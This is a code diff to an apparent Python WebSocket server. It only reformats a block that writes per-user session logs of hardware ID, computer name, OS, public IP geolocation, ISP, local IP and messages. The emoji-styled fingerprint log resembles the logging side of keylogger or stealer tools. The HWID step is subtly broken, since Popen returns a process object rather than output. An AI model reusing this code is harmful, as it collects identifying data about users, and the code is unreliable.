@@ -24,17 +24,17 @@ class WebSocketServer:
 
         with open(f"{self.data_directory}/{username}.txt", 'a+') as file:
             file.write(
-                f"\n 🌟 -------- Session Started -------- 🌟 \n" \
-                f"🖥 HWID: {subprocess.Popen('dmidecode.exe -s system-uuid'.split()) if "nt" in os.name else subprocess.Popen('hal-get-property --udi /org/freedesktop/Hal/devices/computer --key system.hardware.uuid'.split())}\n" \
-                f"💻 Computer Name: {uname()[1]}\n" \
-                f"🖥️ OS: {uname()[0]}" \
-                f"⌨️ OS Version: {uname()[2]}\n" \
-                f"IP 🌍 : {ip_info['query']}\n" \
-                f"Country ⛰ : {ip_info['country']}\n" \
-                f"City 🏠 : {ip_info['city']}\n" \
-                f"TimeZone 🧭 : {ip_info['timezone']}\n" \
-                f"ISP 📡 : {ip_info['isp']}\n" \
-                f"Local IP 🌐 :* {gethostbyname(gethostname())}\n" \
+                f"\n 🌟 -------- Session Started -------- 🌟 \n"
+                f"🖥 HWID: {subprocess.Popen('dmidecode.exe -s system-uuid'.split()) if "nt" in (os.name) else (subprocess.Popen('hal-get-property --udi /org/freedesktop/Hal/devices/computer --key system.hardware.uuid'.split()))}\n"
+                f"💻 Computer Name: {uname()[1]}\n"
+                f"🖥️ OS: {uname()[0]}"
+                f"⌨️ OS Version: {uname()[2]}\n"
+                f"IP 🌍 : {ip_info['query']}\n"
+                f"Country ⛰ : {ip_info['country']}\n"
+                f"City 🏠 : {ip_info['city']}\n"
+                f"TimeZone 🧭 : {ip_info['timezone']}\n"
+                f"ISP 📡 : {ip_info['isp']}\n"
+                f"Local IP 🌐 :* {gethostbyname(gethostname())}\n"
                 f"➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖"
                 f"{timestamp} : 📝 Message : {message}\n"
             )
